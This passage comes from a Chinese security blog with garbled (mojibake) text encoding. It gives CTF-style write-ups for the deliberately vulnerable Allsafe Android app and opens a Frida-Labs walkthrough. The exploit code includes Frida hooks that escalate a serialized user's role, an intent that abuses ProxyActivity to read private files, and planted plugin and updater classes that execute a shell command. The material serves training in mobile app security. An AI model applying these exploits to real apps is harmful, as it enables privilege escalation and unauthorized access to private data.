class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectSerialization</span> &#123;<br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>);<br>            user.role = <span class="hljs-string">&quot;ROLE_EDITOR&quot;</span>;<br><br>            <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;user.dat&quot;</span>);<br>            <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>            oos.writeObject(user);<br>            oos.close();<br>            fos.close();<br><br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> _serialVersionUID _= -<span class="hljs-number">4886601626931750812L</span>; <br><br>        <span class="hljs-keyword">public</span> String username;<br>        <span class="hljs-keyword">public</span> String password;<br>        <span class="hljs-keyword">public</span> String role;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String username, String password)</span> &#123;<br>            <span class="hljs-built_in">this</span>.username = username;<br>            <span class="hljs-built_in">this</span>.password = password;<br>            <span class="hljs-built_in">this</span>.role = <span class="hljs-string">&quot;ROLE_AUTHOR&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;username=&#x27;&quot;</span> + username + <span class="hljs-string">&quot;&#x27;, password=&#x27;&quot;</span> + password + <span class="hljs-string">&quot;&#x27;, role=&#x27;&quot;</span> + role + <span class="hljs-string">&quot;&#x27;&#125;&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è€…ç›´æ¥ hook User ç±»çš„æ„é€ å‡½æ•°ï¼Œä½¿ç”¨åå°„å°† role å±æ€§è®¾ç½®ä¸º <code>ROLE_EDITOR</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>    <br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">UserClass</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;infosecadventures.allsafe.challenges.ObjectSerialization$User&quot;</span>);<br>    <br>    <span class="hljs-title class_">UserClass</span>.<span class="hljs-property">$init</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.String&#x27;</span>, <span class="hljs-string">&#x27;java.lang.String&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params">username, password</span>) &#123;<br>        <span class="hljs-comment">// è°ƒç”¨åŸå§‹æ„é€ å‡½æ•°</span><br>        <span class="hljs-variable language_">this</span>.$init(username, password);<br>        <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// ä½¿ç”¨åå°„ç›´æ¥è®¾ç½®å­—æ®µå€¼</span><br>            <span class="hljs-keyword">var</span> <span class="hljs-title class_">Field</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&#x27;java.lang.reflect.Field&#x27;</span>);<br>            <br>            <span class="hljs-comment">// è·å–roleå­—æ®µ</span><br>            <span class="hljs-keyword">var</span> roleField = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getClass</span>().<span class="hljs-title function_">getDeclaredField</span>(<span class="hljs-string">&#x27;role&#x27;</span>);<br>            roleField.<span class="hljs-title function_">setAccessible</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// ç¡®ä¿å¯è®¿é—®</span><br>            <br>            <span class="hljs-comment">// ç›´æ¥è®¾ç½®å­—æ®µå€¼</span><br>            roleField.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-string">&quot;ROLE_EDITOR&quot;</span>);<br>            <br>            <span class="hljs-comment">// æ£€æŸ¥</span><br>            <span class="hljs-keyword">var</span> newRole = roleField.<span class="hljs-title function_">get</span>(<span class="hljs-variable language_">this</span>);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Modified role type: &quot;</span> + newRole);<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Modified role value: &#x27;&quot;</span> + newRole + <span class="hljs-string">&quot;&#x27;&quot;</span>);<br>            <br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Reflection error: &quot;</span> + e);<br>        &#125;<br>    &#125;;<br>    <br>&#125;);<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶éšä¾¿è¾“å…¥è´¦å·å¯†ç ä¿å­˜åå† LOAD éƒ½å¯ä»¥è·å¾— <code>ROLE_EDITOR</code> æƒé™</p><p><img src="/img/Nt3Tbqo6xoCOWIxVITHczOkNnuh.png"></p><h1 id="Insecure-Providers"><a href="#Insecure-Providers" class="headerlink" title="Insecure Providers"></a>Insecure Providers</h1><p>ä»–ç”¨ç§æœ‰åè®®ä¸‹è½½äº†ä¸€ä¸ª readme.txt æ–‡ä»¶åˆ°åº”ç”¨ç§æœ‰ç›®å½•ï¼Œæ­£å¸¸æƒ…å†µä¸‹è¿™ä¸ªç›®å½•çš„æ–‡ä»¶æ˜¯æ— æ³•è¢«å…¶ä»–åº”ç”¨è¯»å–çš„</p><p><img src="/img/MtPMbFDkHoz8o2xoc57cSwz3nrd.png"></p><p>ä½†æ˜¯ app ä¹Ÿæä¾›äº†ä¸€ä¸ª <code>FileProvider</code> ç”¨äºè¯»å–æ–‡ä»¶ï¼Œä½†å› ä¸ºä¿®å¤è¿‡æ‰€ä»¥è¿™ä¸ª provider æ˜¯ä¸å¯¼å‡ºçš„ï¼Œä¸èƒ½è¢«å¤–éƒ¨åº”ç”¨ app è°ƒç”¨</p><p><img src="/img/He0Fb4KWeoFt7oxl3uKcbXddnvf.png"></p><p>ä½†åˆšå¥½ä»–ä»£ç é‡Œæä¾›äº†ä¸€ä¸ª ProxyActivityï¼Œæ¥å—ä¸€ä¸ª intentï¼Œç„¶åç”¨ startActivity è°ƒç”¨ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ ProxyActivity å¯åŠ¨ FileProvider æ¥å®ç°å¯¹ app ç§æœ‰ç›®å½•ä¸‹çš„æ–‡ä»¶è¯»å–</p><p><img src="/img/DCNYbVBidogKk0xEUUjc1no6n8d.png"></p><p>å†™ä¸€ä¸ªç®€å•çš„ intent è°ƒç”¨ demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.myapplication;<br><br><span class="hljs-keyword">import</span> android.content.ComponentName;<br><span class="hljs-keyword">import</span> android.content.Intent;<br><span class="hljs-keyword">import</span> android.net.Uri;<br><span class="hljs-keyword">import</span> android.os.Bundle;<br><span class="hljs-keyword">import</span> android.util.Log;<br><span class="hljs-keyword">import</span> androidx.activity.ComponentActivity;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ComponentActivity</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">(Bundle savedInstanceState)</span> &#123;<br>        <span class="hljs-built_in">super</span>.onCreate(savedInstanceState);<br><br>        <span class="hljs-type">Uri</span> <span class="hljs-variable">targetUri</span> <span class="hljs-operator">=</span> Uri._parse_(<span class="hljs-string">&quot;content://infosecadventures.allsafe.fileprovider/files/docs/readme.txt&quot;</span>);<br><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">readIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>(Intent._ACTION_VIEW_);<br>        readIntent.setDataAndType(targetUri, <span class="hljs-string">&quot;text/plain&quot;</span>);<br>        readIntent.setFlags(Intent._FLAG_GRANT_READ_URI_PERMISSION_);<br><br>        <span class="hljs-type">Intent</span> <span class="hljs-variable">proxyIntent</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Intent</span>();<br>        proxyIntent.setComponent(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentName</span>(<br>                <span class="hljs-string">&quot;infosecadventures.allsafe&quot;</span>,<br>                <span class="hljs-string">&quot;infosecadventures.allsafe.ProxyActivity&quot;</span><br>        ));<br>        proxyIntent.putExtra(<span class="hljs-string">&quot;extra_intent&quot;</span>, readIntent);<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            startActivity(proxyIntent);<br>            Log._d_(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Proxy intent sent!&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(<span class="hljs-string">&quot;Exploit&quot;</span>, <span class="hljs-string">&quot;Failed to launch intent: &quot;</span> + e.getMessage());<br>        &#125;<br><br>        finish();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ï¼ˆä¸çŸ¥é“ä¸ºä»€ä¹ˆ readme æ²¡æœ‰ä¸‹è½½ä¸‹æ¥ï¼Œæ‰€ä»¥åªå¥½è‡ªå·±åˆ›å»ºä¸€ä¸ªä½œä¸ºæ¼”ç¤ºï¼‰</p><p><img src="/img/NYRybgeRKog6omxBCLuctQVCnhc.png"></p><h1 id="Arbitrary-Code-Execution"><a href="#Arbitrary-Code-Execution" class="headerlink" title="Arbitrary Code Execution"></a>Arbitrary Code Execution</h1><p>ä¼šåŒæ—¶è°ƒç”¨ <code>invokePlugins</code> å’Œ <code>invokeUpdate</code> æ–¹æ³•</p><ol><li><strong>ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ (invokePlugins æ–¹æ³•)</strong></li></ol><ul><li>éå†æ‰€æœ‰åŒ…åä»¥ <code>infosecadventures.allsafe</code> å¼€å¤´çš„å·²å®‰è£…åº”ç”¨</li><li>é€šè¿‡åå°„åŠ è½½å¹¶æ‰§è¡Œä»»æ„æ’ä»¶ç±»ï¼š<code>infosecadventures.allsafe.plugin.Loader.loadPlugin()</code></li></ul><ol start="2"><li><strong>DexClassLoader è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ (invokeUpdate æ–¹æ³•)</strong></li></ol><ul><li>ä» SD å¡åŠ è½½ <code>/sdcard/Download/allsafe_updater.apk</code></li><li>ä½¿ç”¨ DexClassLoader åŠ¨æ€åŠ è½½ DEX æ–‡ä»¶</li><li>æ‰§è¡Œå…¶ä¸­çš„ <code>infosecadventures.allsafe.updater.VersionCheck.getLatestVersion()</code> æ–¹æ³•</li></ul><p><img src="/img/KiJPbWUo7o1iflx4NgKcD6fenJ6.png"></p><p>å¯¹äº <code>invokePlugins</code>ï¼Œåªéœ€è¦åˆ›å»ºä¸€ä¸ªä»¥ <code>infosecadventures.allsafe</code> å¼€å¤´çš„ appï¼Œç„¶åå®šä¹‰ <code>infosecadventures.allsafe.plugin.Loader</code> ç±»å’Œ <code>loadPlugin</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.plugin;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Loader</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> String _TAG _= <span class="hljs-string">&quot;PluginLoader&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadPlugin</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime._getRuntime_().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine(); <br>            Log._d_(_TAG_, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(_TAG_, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">adb shell <span class="hljs-string">&quot;logcat | grep Command&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/WEI3b0IAioGoBOx9ldMceTrmnmh.png"></p><p>å¯¹äº <code>invokeUpdate</code>ï¼Œè¯»å– <code>/sdcard/Download/</code> ä¸‹çš„ <code>allsafe_updater.apk</code>ï¼Œç„¶åè°ƒç”¨äº† <code>infosecadventures.allsafe.updater.VersionCheck</code> ç±»çš„ <code>getLatestVersion</code> æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.updater;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionCheck</span> &#123;<br><br>    <span class="hljs-keyword">public</span> img <span class="hljs-keyword">void</span> <span class="hljs-title function_">getLatestVersion</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime._getRuntime_().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine();<br>            Log._d_(_TAG_, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log._e_(_TAG_, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å‘½ä»¤å¹¶æ²¡æœ‰è¢«æ‰§è¡Œï¼Œæˆ‘ hook äº† <code>DexClassLoader</code> çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå‘ç°æŠ¥é”™äº†</p><p><img src="/img/X5pxbJq4JoaZMOxgrNPc08jBnFe.png"></p><p>å›å¤´çœ‹çœ‹ä»£ç ï¼Œå‘ç°ä»–æœŸæœ›å‡½æ•°è°ƒç”¨åè¿”å›ä¸€ä¸ª int æ•°å€¼</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">**int** version = ((Integer) objInvoke).intValue();<br></code></pre></td></tr></table></figure><p>æ”¹äº†ä¸€ä¸‹è¿”å›ç±»å‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> infosecadventures.allsafe.updater;<br><br><span class="hljs-keyword">import</span> android.util.Log;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.InputStreamReader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VersionCheck</span> &#123;<br>    <span class="hljs-keyword">private</span> img <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;VersionCheck&quot;</span>;<br>    <br>    <span class="hljs-keyword">public</span> img <span class="hljs-type">int</span> <span class="hljs-title function_">getLatestVersion</span><span class="hljs-params">()</span> &#123;  <br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;id&quot;</span>);<br>            <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(process.getInputStream()));<br>            <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> reader.readLine();<br>            Log.d(TAG, <span class="hljs-string">&quot;Command Output: &quot;</span> + output);<br>            reader.close();<br>            <br>            <span class="hljs-keyword">return</span> <span class="hljs-number">999</span>;  <br>            <br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;Error executing payload&quot;</span>, e);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">999</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°è¿˜æ˜¯ä¸è¡Œï¼Œhook äº†ä¸€äº› file å¯¹è±¡ï¼Œè·¯å¾„åº”è¯¥å°±æ˜¯ <code>/sdcard/Downloadall/safe_updater.apk</code>ï¼Œfrida æ²¡æœ‰æƒé™ä¸»åŠ¨åŠ è½½è¿™ä¸ª apkï¼Œallsafe ä¹Ÿæ²¡æœ‰æ‰§è¡Œæˆæœï¼ˆT T è¿˜æ˜¯å¤ªèœäº† ï¼‰</p><h1 id="Native-Library"><a href="#Native-Library" class="headerlink" title="Native Library"></a>Native Library</h1><p><code>checkPassword</code> æ˜¯ä¸€ä¸ª native æ–¹æ³•</p><p><img src="/img/NxDfbByLzo508IxpIdqcuDMNnRV.png"></p><p>æ‰¾åˆ° JNI æ–¹æ³• <code>checkPassword</code></p><p><img src="/img/M9hibfq29oVBBtxiTLjczJN0nob.png"></p><p>ä¸€è·¯è¿½è¸ªæ‰¾åˆ°ç¡¬ç¼–ç çš„å¯†ç  <code>supersecret</code></p><p><img src="/img/UjyxbEICxooMkqxFapzc5mnQnVb.png"></p><p><img src="/img/SauDbppqboa04AxbkubcFE3bnOf.png"></p><h1 id="Smali-Patch"><a href="#Smali-Patch" class="headerlink" title="Smali Patch"></a><strong>Smali Patch</strong></h1><p>è¿™ä¸ª if åˆ¤æ–­ active æ˜¯å¦ç­‰äº inactive æ°¸è¿œä¸ºå‡ï¼Œèƒ½åšçš„æ–¹æ³•æœ‰å¾ˆå¤š</p><p>é¢˜ç›®å¸Œæœ›ç”¨ <code>Patch Smaliå­—èŠ‚ç </code> çš„æ–¹å¼æ¥ç»•è¿‡åˆ¤æ–­</p><p><img src="/img/LsM4b9kQ1o84dRx44iHc0MOfnMg.png"></p><p>if-eqz æ˜¯åˆ¤æ–­ç›¸ç­‰ï¼Œåªéœ€æŠŠ <strong>if-eqz</strong> æ”¹æˆ <strong>if-nez</strong><strong>(ä¸ç›¸ç­‰)å³å¯</strong></p><p><img src="/img/HldgbdQ2mocdW0xR4lKcrlnDnbe.png"></p><p><img src="/img/Eig4bOq4gotGwqxF7x3cEGsSnnh.png"></p><p>patch å®Œåé‡æ–°å®‰è£…ï¼Œå°±å¯ä»¥ç»•è¿‡äº†</p><p><img src="/img/DqnZb7gh8opIXHx31WvcwnHin5k.png"></p><hr><h2 id="ğŸ“„-è®¸å¯è¯"><a href="#ğŸ“„-è®¸å¯è¯" class="headerlink" title="ğŸ“„ è®¸å¯è¯"></a>ğŸ“„ è®¸å¯è¯</h2><p>æœ¬æ–‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International (CC BY 4.0)</a> è®¸å¯è¯ã€‚</p><p>è¿™æ„å‘³ç€ä½ å¯ä»¥è‡ªç”±åœ°ï¼š</p><ul><li><strong>åˆ†äº«</strong> â€” ä»¥ä»»ä½•åª’ä»‹æˆ–æ ¼å¼å¤åˆ¶åŠåˆ†å‘æœ¬ææ–™</li><li><strong>æ”¹ç¼–</strong> â€” é‡æ··ã€è½¬æ¢å’ŒåŸºäºæœ¬ææ–™åˆ›ä½œï¼Œé€‚ç”¨äºä»»ä½•ç›®çš„ï¼ŒåŒ…æ‹¬å•†ä¸šç”¨é€”</li></ul><p>åœ¨ä»¥ä¸‹æ¡ä»¶ä¸‹ï¼š</p><ul><li><strong>ç½²å</strong> â€” ä½ å¿…é¡»ç»™å‡ºé€‚å½“çš„ç½²åï¼Œæä¾›æŒ‡å‘æœ¬è®¸å¯è¯çš„é“¾æ¥ï¼ŒåŒæ—¶æ ‡æ˜æ˜¯å¦ä½œå‡ºäº†ä¿®æ”¹</li></ul>]]></content>
    
    
    <categories>
      
      <category>ç§»åŠ¨å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>frida-labs WP</title>
    <link href="/2025/09/07/frida-labs-WP/"/>
    <url>/2025/09/07/frida-labs-WP/</url>
    
    <content type="html"><![CDATA[<h1 id="Frida-Labs"><a href="#Frida-Labs" class="headerlink" title="Frida Labs"></a>Frida Labs</h1><blockquote><p>åŒä¸€é“é¢˜æœ‰æ—¶å€™ç”¨ frida hook äº†è¿”å›ç»“æœå°±èƒ½è¾“å‡ºç»“æœï¼Œä½†æ˜¯å¦‚æœè¾“å…¥æˆåŠŸäº†å¹¶ä¸ä¼šè¿”å›æ­£ç¡®å€¼å°±è¦é€†å‘ï¼Œæ‰€æœ‰ ctf å‡ºé¢˜çš„æ—¶å€™éƒ½åªå­˜å‚¨ flag çš„å¯†ç ï¼Œç„¶åå°†è¾“å…¥å€¼åŠ å¯†åå†ä¸å…¶å¯¹æ¯”ï¼Œè¿™æ—¶å€™ frida å°±æ²¡ä»€ä¹ˆç”¨<br>ctf é‡Œé¢çš„å®‰å“å¤§å¤šæ•°æ˜¯ä¸ºäº†é€†å‘ï¼Œä½†æ˜¯å®é™…åº”ç”¨ä¸­ï¼Œfrida å¤§å¤šç”¨æ¥ç»•è¿‡ï¼Œå› ä¸ºå¹¶æ²¡æœ‰é‚£ä¹ˆå¤šéœ€è¦é€†å‘çš„åœ°æ–¹</p></blockquote><p><a href="https://github.com/DERE-ad2001/Frida-Labs.git">https://github.com/DERE-ad2001/Frida-Labs.git</a></p><h1 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h1><p>ç¬¬ä¸€å…³å°±æ˜¯ä¸€ä¸ªå¾ˆå…¸å‹çš„æ¡ˆä¾‹ï¼Œflag æ˜¯è¢«åŠ å¯†çš„ï¼Œå¦‚æœè¾“å…¥äº†æ­£ç¡®çš„æ•°å€¼å°±è‡ªåŠ¨è§£å¯†å°†å…¶è¾“å‡ºè·å¾— flagï¼Œæ­¤æ—¶å¯ä»¥ç›´æ¥è§£å¯†è·å¾—åˆ° flagï¼Œä½†ä» frida è§’åº¦æ¥çœ‹ï¼Œå¯ä»¥ç›´æ¥å›ºå®š <code>get_random</code> æ–¹æ³•çš„è¿”å›å€¼ï¼Œç›´æ¥è·å– flag</p><p><img src="/img/SExxbfm2goT7dBxYapycC0EAndd.png"></p><p>å›ºå®š <code>get_random</code> è¿”å›å€¼ä¸º 1</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br><span class="hljs-keyword">var</span> a = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>)<br>a.<span class="hljs-property">get_random</span>.<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;get_random called&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>å› ä¸ºä»–çš„åˆ¤æ–­ä¸æ˜¯å¾ˆéš¾ï¼Œ<code>(i * 2) + 4 == i2</code> æ‰€ä»¥åªéœ€è¦æ‰¾ä¸€ä¸ªæ»¡è¶³è¿™ä¸ªå…³ç³»çš„ä¸¤ä¸ªæ•°å°±å¯ä»¥è®©ç›´æ¥è¾“å‡º flag</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span 